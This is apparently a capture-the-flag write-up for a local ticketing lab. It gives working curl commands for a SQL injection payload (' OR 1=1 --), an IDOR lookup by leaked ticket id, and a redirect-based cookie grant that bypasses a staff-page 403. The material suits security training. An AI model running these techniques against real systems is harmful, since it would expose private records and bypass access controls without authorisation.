# Challenge 1 Writeup

Base URL: `http://challenge1.localhost`

## c1-1: SQL Injection

The ticket search interpolates `q` directly into a raw `LIKE` query.

```bash
curl -G "http://challenge1.localhost/api/tickets/search/" \
  --data-urlencode "q=' OR 1=1 --"
```

The staff-only `P0 archive sync stalled` ticket contains the first flag. Save its `id` for the next step.

## c1-2: IDOR

Ticket detail looks up by `external_id` without queue or ownership scoping.

```bash
curl "http://challenge1.localhost/api/tickets/<leaked_id>/"
```

The incident thread contains the second flag and points to the staff page.

## c1-3: Open Redirect and Workflow Trust

Direct access to the staff page returns `403`, but `/back/` grants a `staff_nav` cookie when `next` starts with `/staff/`.

```bash
curl -s -c /tmp/cj \
  "http://challenge1.localhost/back/?next=/staff/handover/<leaked_id>/"
curl -s -b /tmp/cj \
  "http://challenge1.localhost/staff/handover/<leaked_id>/"
```

The handover page contains the third flag.
